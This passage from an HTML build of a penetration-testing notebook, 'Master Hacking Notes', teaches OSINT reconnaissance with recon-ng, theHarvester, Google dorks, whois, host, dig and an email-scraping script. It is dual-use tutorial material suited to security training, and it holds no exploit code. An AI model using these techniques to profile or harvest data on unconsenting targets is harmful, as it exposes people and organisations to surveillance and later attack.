@@ -1,0 +1,1492 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js navy">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Master Hacking Notes</title>
+        <meta name="robots" content="noindex" />
+
+
+        <!-- Custom HTML head -->
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('navy')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">MHN</a></li><li class="chapter-item "><a href="Reconnaissance/index.html">Reconnaissance</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/OSINT/index.html">OSINT</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/index.html">Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/recon-ng.html">recon-ng</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/theHarvester.html">theHarvester</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/OSINT/General.html">General</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Google Dorks.html">Google Dorks</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Domain Name Enumeration.html">Domain Name Enumeration</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Harvesting E-Mails.html">Harvesting E-Mails</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/Active/index.html">Active</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/nmap/index.html">Nmap</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/nmap/TCP SYN & TCP Connect scans.html">TCP SYN &amp; TCP Connect scans</a></li><li class="chapter-item "><a href="Reconnaissance/Active/nmap/FIN, NULL & XMAS Scans.html">FIN, NULL &amp; XMAS Scans</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/Active/Network Scanning.html">Network Scanning</a></li><li class="chapter-item "><a href="Reconnaissance/Active/DNS Server Enumeration.html">DNS Server Enumeration</a></li></ol></li></ol></li><li class="chapter-item "><a href="Exploitation/index.html">Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/index.html">Binary Exploitation</a></li><li class="chapter-item "><a href="Exploitation/DNS/index.html">DNS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/DNS/DNS Cache Poisoning.html">DNS Cache Poisoning</a></li><li class="chapter-item "><a href="Exploitation/DNS/DNS Traffic Amplification.html">DNS Traffic Amplification</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Web/index.html">Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Introduction.html">SQL Injection</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Finding SQLi.html">Finding SQLi</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Union injections.html">Union injections</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Defences.html">Defences</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Cheatsheets.html">Cheatsheet</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Web/CRLF Injection.html">CRLF Injection</a></li><li class="chapter-item "><a href="Exploitation/Web/Cross-Site Request Forgery.html">Cross-Site Request Forgery</a></li><li class="chapter-item "><a href="Exploitation/Web/Cross-Site Scripting.html">Cross-Site Scripting</a></li><li class="chapter-item "><a href="Exploitation/Web/HTTP Parameter Pollution.html">HTTP Parameter Pollution</a></li><li class="chapter-item "><a href="Exploitation/Web/HTTP Response Splitting.html">HTTP Response Splitting</a></li><li class="chapter-item "><a href="Exploitation/Web/Open Redirect.html">Open Redirect</a></li><li class="chapter-item "><a href="Exploitation/Web/Template Injection.html">Template Injection</a></li></ol></li></ol></li><li class="chapter-item "><a href="Post Exploitation/index.html">Post Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/index.html">Active Directory (AD)</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/Domain Data Enumeration with Bloodhound.html">Domain Data Enumeration with Bloodhound</a></li><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/Domain Enumeration with PowerView.html">Domain Enumeration with PowerView</a></li></ol></li><li class="chapter-item "><div>Pivoting</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Pivoting/Tunneling with Chisel.html">Tunneling with Chisel</a></li></ol></li></ol></li><li class="chapter-item "><a href="Malware Analysis/index.html">Malware Analysis</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Malware Analysis/Basic Static Analysis.html">Basic Static Analysis</a></li></ol></li><li class="chapter-item "><a href="Networking/index.html">Networking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/DNS/index.html">DNS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/DNS/The Domain Name System.html">The Domain Name System</a></li><li class="chapter-item "><a href="Networking/DNS/The in-addr.arpa Domain.html">The in-addr.arpa Domain</a></li><li class="chapter-item "><a href="Networking/DNS/DNS Protocol.html">DNS Protocol</a></li></ol></li><li class="chapter-item "><a href="Networking/Network Address Translation (NAT).html">Network Address Translation (NAT)</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/index.html">Reverse Engineering</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/index.html">Program Anatomy</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/Instructions.html">Instructions</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/Registers.html">Registers</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/The Stack.html">The Stack</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/index.html">Reverse Engineering with radare2</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Analysis.html">Analysis</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Binary Info.html">Binary Info</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Flags.html">Flags</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Seeking.html">Seeking</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Strings.html">Strings</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Assembly.html">Assembly</a></li><li class="chapter-item "><a href="Reverse Engineering/Basic Reverse Engineering using objdump, strace, and ltrace.html">Basic Reverse Engineering using objdump, strace, and ltrace</a></li></ol></li><li class="chapter-item "><a href="Web/index.html">Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Web/Duplicate HTTP Parameter Handling.html">Duplicate HTTP Parameter Handling</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Master Hacking Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/cr0mll/master-hacking-notes/" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="mhn"><a class="header" href="#mhn">MHN</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="osint"><a class="header" href="#osint">OSINT</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="osint-1"><a class="header" href="#osint-1">OSINT</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-recon-ng"><a class="header" href="#what-is-recon-ng">What is recon-ng?</a></h1>
+<p>Recon-ng is a powerful open-source framework for conducting OSINT. It is available at https://github.com/lanmaster53/recon-ng</p>
+<h1 id="setup"><a class="header" href="#setup">Setup</a></h1>
+<p>recon-ng comes pre-installed with Kali, but can be downloaded on Debian-based distros through the <code>apt</code> package manager.</p>
+<pre><code class="language-bash">sudo apt install recon-ng
+</code></pre>
+<p>For many of the modules you will need to add API keys. More on that you can read <a href="https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys">here</a>.</p>
+<p>You will need to install any modules before using them. You can install all modules with the following command inside recon-ng:</p>
+<pre><code class="language-bash">marketplace install all
+</code></pre>
+<pre><code class="language-bash">[recon-ng][default] &gt; marketplace install all
+[*] Module installed: discovery/info_disclosure/cache_snoop
+[*] Module installed: discovery/info_disclosure/interesting_files
+[*] Module installed: exploitation/injection/command_injector
+[*] Module installed: exploitation/injection/xpath_bruter
+[*] Module installed: import/csv_file
+[*] Module installed: import/list
+[*] Module installed: import/masscan
+[*] Module installed: import/nmap
+--snip--
+[*] Reloading modules...
+</code></pre>
+<p>You will also see errors for any API keys you haven't set up yet:</p>
+<pre><code class="language-bash">[!] 'github_api' key not set. github_commits module will likely fail at runtime. See 'keys add'.
+[!] Module 'recon/netblocks-companies/censys_netblock_company' disabled. Dependency required: ''censys''.
+[!] 'whoxy_api' key not set. whoxy_whois module will likely fail at runtime. See 'keys add'.
+[!] Module 'recon/domains-companies/censys_companies' disabled. Dependency required: ''censys''.
+[!] 'bing_api' key not set. bing_linkedin_contacts module will likely fail at runtime. See 'keys add'.
+[!] 'github_api' key not set. github_users module will likely fail at runtime. See 'keys add'.
+[!] Module 'recon/hosts-hosts/censys_hostname' disabled. Dependency required: ''censys''.
+[!] Module 'recon/hosts-hosts/censys_ip' disabled. Dependency required: ''censys''.
+[!] 'ipinfodb_api' key not set. ipinfodb module will likely fail at runtime. See 'keys add'.
+--snip--
+</code></pre>
+<h1 id="workflow"><a class="header" href="#workflow">Workflow</a></h1>
+<ol>
+<li>
+<p>Workspaces - recon-ng organises gathered information into workspaces, which are managed with the <code>workspaces</code> command. Workspaces are stored in <code>~/.recon-ng/workspaces</code></p>
+<ul>
+<li>
+<p>create a workspace:</p>
+<pre><code class="language-bash">workspaces create &lt;name&gt;
+</code></pre>
+<pre><code class="language-bash">[recon-ng][default] &gt; workspaces create MHN
+[recon-ng][MHN] &gt;
+</code></pre>
+</li>
+<li>
+<p>list all workspaces:</p>
+<pre><code class="language-bash">worspaces list
+</code></pre>
+<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/recon-ng-workspaces-list.png" alt="" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Modules - recon-ng organises its functionality into the so-called modules which need to be installed before they may be used.</p>
+<ul>
+<li>
+<p>load a module:</p>
+<pre><code class="language-bash">modules load &lt;name&gt;
+</code></pre>
+<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/recon-ng-modules-load.png" alt="" /></p>
+</li>
+<li>
+<p>run a module:</p>
+<pre><code class="language-bash">run
+</code></pre>
+<pre><code class="language-bash">[recon-ng][MHN][profiler] &gt; run
+[!] Source contains no input.
+</code></pre>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="modules"><a class="header" href="#modules">Modules</a></h1>
+<h3 id="profiler"><a class="header" href="#profiler">profiler</a></h3>
+<p>This module is a <em>profile collector</em> - it searches the Web for user profiles belonging to target individuals and stores any information it finds in the recon-ng database. It uses a table called <code>profiles</code> as its source.</p>
+<ul>
+<li>insert a username into the table:
+<pre><code class="language-bash">db insert profiles &lt;username&gt;~~~~
+</code></pre>
+<pre><code class="language-bash">[recon-ng][MHN][profiler] &gt; db insert profiles testuser~~~~
+[*] 1 rows affected.
+[recon-ng][MHN][profiler] &gt; show profiles
+
++---------------------------------------------------------------------+
+| rowid | username | resource | url | category | notes |    module    |
++---------------------------------------------------------------------+
+| 1     | testuser |          |     |          |       | user_defined |
++---------------------------------------------------------------------+
+
+[*] 1 rows returned
+</code></pre>
+<ul>
+<li>you can also insert an e-mail address or just the first part of one (without the @ and domain)</li>
+<li>inserting multiple usernames and/or e-mail addresses is also possible</li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-theharvester"><a class="header" href="#what-is-theharvester">What is theHarvester?</a></h1>
+<p>theHarvester is a powerful tool for gathering emails, names, subdomains, IPs, and URLs using a multitude of publicly available data sources. The tool is primarily a passive reconnaissance tool, however, it does employ some active reconnaissance, too. The active aspects are the DNS brute force and the screenshots it can take of any subdomains that were found. The GitHub page for theHarvester is located at https://github.com/laramies/theHarvester.</p>
+<h1 id="email-and-subdomain-harvesting"><a class="header" href="#email-and-subdomain-harvesting">Email and subdomain harvesting</a></h1>
+<p>All you need to get started is a domain name. You specify it with the <code>-d</code> argument. You need to provide a data source using the <code>-b</code> option. These are the sources you can choose from:</p>
+<p><code>baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all</code></p>
+<p>This is a simple theHarvester query:</p>
+<pre><code class="language-bash">theHarvester -d kali.org -b google
+</code></pre>
+<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/theHarvester-simple-results.png" alt="" /></p>
+<p>Additional options:</p>
+<ul>
+<li><code>-l</code> - limit the number of results to work with</li>
+<li><code>-s</code> - start in the specified result number</li>
+<li><code>-h</code> - use SHODAN database to query discovered hosts</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="what-are-you-looking-for"><a class="header" href="#what-are-you-looking-for">What are you looking for?</a></h1>
+<p>The goal of OSINT (OpenSource Intelligence Gathering) is to obtain information about the victim. This is <em>passive</em> reconnaissance as it doesn't interact with the target systems at all and is therefore not detectable. You should be generally looking for the following:</p>
+<ul>
+<li>usernames, profile names and email addresses</li>
+<li>passwords, PINs, private keys</li>
+<li>domain names</li>
+<li>hostnames</li>
+<li>software and OS types, versions, and names</li>
+<li>IP addresses</li>
+<li>technical documentation</li>
+</ul>
+<h1 id="where-can-you-find-this-information"><a class="header" href="#where-can-you-find-this-information">Where can you find this information?</a></h1>
+<ul>
+<li>social media (Facebook, Instagram, LinkedIn, Twitter, YouTube, etc.)</li>
+<li>personal websites</li>
+<li>accounts in forums and common platforms such as Github</li>
+<li>public databases (wireless registrars, ICANN, domain name registrars, libraries, and even phone directories)</li>
+<li>peer-to-peer sharing networks</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
+<p>Goolge can be a very powerful tool in your OSINT toolkit. <em>Google dorking</em> or <em>Google hacking</em> is the art of using specially crafted Google queries to expose sensitive information on the Internet. Such a query is called a <em>Google dork</em>.</p>
+<p>You may find all sorts of data and information, including exposed <em>passwd</em> files, lists with usernames, software versions, and so on.</p>
+<p><em>Note: If you find such an exposed web server, do NOT click on the links from the search results. Such an act may be considered illegal! Only do this if you have written permission from the target system's owner.</em></p>
+<p>A good resource for finding Google dorks is the Google Hacking Database located at https://www.exploit-db.com/google-hacking-database.</p>
+<p><em>You shouldn't enter any spaces between the advanced search operator and the query</em>.</p>
+<h1 id="common-operators"><a class="header" href="#common-operators">Common operators</a></h1>
+<p><strong>site:</strong> - restricts the search results to those only on the specified domain or site</p>
+<p><strong>inurl:</strong> - restricts results to pages containing the specified word in the URL</p>
+<p><strong>allinurl:</strong> - restricts results to pages containing all the specified words in the URL</p>
+<p><strong>intitle:</strong> - restricts results to pages containing the specified word in the title</p>
+<p><strong>allintitle:</strong> - restricts results to pages containing all the specified words in the title</p>
+<p><strong>inanchor:</strong> - restricts results to pages containing the specified word in the anchor text of links located on that page</p>
+<ul>
+<li>an anchor text is the text displayed for links instead of the URL</li>
+</ul>
+<p><strong>allinanchor:</strong> - restricts results to pages containing all the specified terms in the anchor text of links located on that page</p>
+<p><strong>cache:</strong> - displays Google's cached version of the webpage instead of the current version</p>
+<p><strong>link:</strong> - searches for pages that contain links pointing to the specified site or page</p>
+<ul>
+<li>you can't combine a link operator with a regular keyword query</li>
+<li>combining link: with other advanced search operators may not yield all the matching results</li>
+</ul>
+<p><strong>related:</strong> - displays websites similar or related to the one specified</p>
+<p><strong>info:</strong> - finds information about a specific page</p>
+<p><strong>location:</strong> - finds location information about a specific query</p>
+<p><strong>filetype:</strong> - restricts results to the specified filetype</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="using-whois-for-gathering-domain-name-and-ip-address-information"><a class="header" href="#using-whois-for-gathering-domain-name-and-ip-address-information">Using whois for gathering domain name and IP address information</a></h1>
+<p><code>whois</code> is a tool for finding domain name and IP address information which can be used as part of your OSINT gathering because it uses public data sources. You can use it as follows:</p>
+<pre><code class="language-bash">whois &lt;hostname&gt;
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
+└─$ whois tesla.com                                                                                                                                                                                                                      1 ⨯
+   Domain Name: TESLA.COM
+   Registry Domain ID: 187902_DOMAIN_COM-VRSN
+   Registrar WHOIS Server: whois.markmonitor.com
+   Registrar URL: http://www.markmonitor.com
+   Updated Date: 2020-10-02T09:07:57Z
+   Creation Date: 1992-11-04T05:00:00Z
+   Registry Expiry Date: 2022-11-03T05:00:00Z
+   Registrar: MarkMonitor Inc.
+   Registrar IANA ID: 292
+   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com
+   Registrar Abuse Contact Phone: +1.2083895740
+   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
+   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
+   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
+   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited
+   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
+   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited
+   Name Server: A1-12.AKAM.NET
+   Name Server: A10-67.AKAM.NET
+   Name Server: A12-64.AKAM.NET
+   Name Server: A28-65.AKAM.NET
+   Name Server: A7-66.AKAM.NET
+   Name Server: A9-67.AKAM.NET
+   Name Server: EDNS69.ULTRADNS.BIZ
+   Name Server: EDNS69.ULTRADNS.COM
+   Name Server: EDNS69.ULTRADNS.NET
+   Name Server: EDNS69.ULTRADNS.ORG
+   DNSSEC: unsigned
+   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
+&gt;&gt;&gt; Last update of whois database: 2021-09-14T09:01:10Z &lt;&lt;&lt;
+</code></pre>
+<h1 id="using-host-for-quick-lookups"><a class="header" href="#using-host-for-quick-lookups">Using host for quick lookups</a></h1>
+<p><code>host</code> is DNS querying tool which can be used for quick lookups. It will often return more than a single IP address:</p>
+<pre><code class="language-bash">host &lt;hostname or IP&gt;
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
+└─$ host google.com                
+google.com has address 172.217.169.174
+google.com has IPv6 address 2a00:1450:4017:80a::200e
+google.com mail is handled by 10 aspmx.l.google.com.
+google.com mail is handled by 20 alt1.aspmx.l.google.com.
+google.com mail is handled by 40 alt3.aspmx.l.google.com.
+google.com mail is handled by 30 alt2.aspmx.l.google.com.
+google.com mail is handled by 50 alt4.aspmx.l.google.com.
+</code></pre>
+<p>You can also do reverse name lookups by supplying an IP address:</p>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
+└─$ host 8.8.8.8        
+8.8.8.8.in-addr.arpa domain name pointer dns.google.
+</code></pre>
+<p>A special domain <code>in-addr.arpa</code> is used for reverse DNS lookups. You can read more about it <a href="Reconnaissance/OSINT/../../Networking/DNS/The%20in-addr.arpa%20Domain.html">here</a>.</p>
+<h1 id="querying-name-servers-with-dig"><a class="header" href="#querying-name-servers-with-dig">Querying name servers with dig</a></h1>
+<p><code>dig</code> is a tool for performing DNS queries. It can be used to request specific resource records such as the SOA.</p>
+<pre><code class="language-bash">dig &lt;domain&gt; SOA
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
+└─$ dig google.com SOA
+
+; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; google.com SOA
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41904
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
+;; QUESTION SECTION:
+;google.com.                    IN      SOA
+
+;; ANSWER SECTION:
+google.com.             5       IN      SOA     ns1.google.com. dns-admin.google.com. 396314134 900 900 1800 60
+
+;; Query time: 8 msec
+;; SERVER: 192.168.129.2#53(192.168.129.2)
+;; WHEN: Tue Sep 14 15:43:28 EEST 2021
+;; MSG SIZE  rcvd: 89
+</code></pre>
+<p>We can see that the SOA is listed as <code>ns1.google.com</code> in the <code>ANSWER SECTION</code>. You can find the IP of this name server with dig, too.</p>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
+└─$ dig ns1.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; ns1.google.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41311
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
+;; QUESTION SECTION:
+;ns1.google.com.                        IN      A
+
+;; ANSWER SECTION:
+ns1.google.com.         5       IN      A       216.239.32.10
+
+;; Query time: 43 msec
+;; SERVER: 192.168.129.2#53(192.168.129.2)
+;; WHEN: Tue Sep 14 15:47:51 EEST 2021
+;; MSG SIZE  rcvd: 59
+</code></pre>
+<p>Note that usually the SOA for domains of smaller organizations, isn't actually a part of that domain, but is instead a server provided by a hosting company.</p>
+<p>Notice how in the answer section for <code>google.com</code> there was a <code>dns-admin.google.com</code> domain? That's actually not a domain, it's an email address and should be read as <code>dns-admin@google.com</code>. Yep, DNS stores emails in zone files, too. But how do you figure out which one is a hostname and which is an email address? The email address comes last.</p>
+<p><code>dig</code> can also be used to query specific name servers with the following syntax:</p>
+<pre><code class="language-bash">dig @&lt;name server&gt; &lt;domain&gt;
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
+└─$ dig @192.168.129.138 nsa.gov     
+
+; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @192.168.129.138 nsa.gov
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48156
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;nsa.gov.                       IN      A
+
+;; AUTHORITY SECTION:
+nsa.gov.                600     IN      SOA     ns1.nsa.gov. root.nsa.gov. 2007010401 3600 600 86400 600
+
+;; Query time: 0 msec
+;; SERVER: 192.168.129.138#53(192.168.129.138)
+;; WHEN: Tue Sep 14 15:57:47 EEST 2021
+;; MSG SIZE  rcvd: 81
+</code></pre>
+<p>Here we notice that there is no <code>ANSWER SECTION</code>, but there is an <code>AUTHORITY SECTION</code>. The queried server didn't reply with a direct answer to our request but instead pointed us to the name server responsible for answering queries about <code>nsa.gov</code>, which turns out to be <code>ns1.nsa.gov</code>. </p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="grabbing-e-mails-from-google-using-goog-mailpy"><a class="header" href="#grabbing-e-mails-from-google-using-goog-mailpy">Grabbing E-Mails from Google using goog-mail.py</a></h1>
+<p><code>goog-mail.py</code> is a useful script used for getting email addresses from Google search results. Its author is unknown, but the script is available in many different places online.</p>
+<ol>
+<li>You will need to download the script from https://github.com/leebaird/discover/blob/master/mods/goog-mail.py (or any other place you found it)</li>
+</ol>
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0㉿kali)-[~/MHN/Reconnaissance/OSINT]
+└─$ wget https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py                                                                                                                                                    1 ⨯
+--2021-09-06 10:05:18--  https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
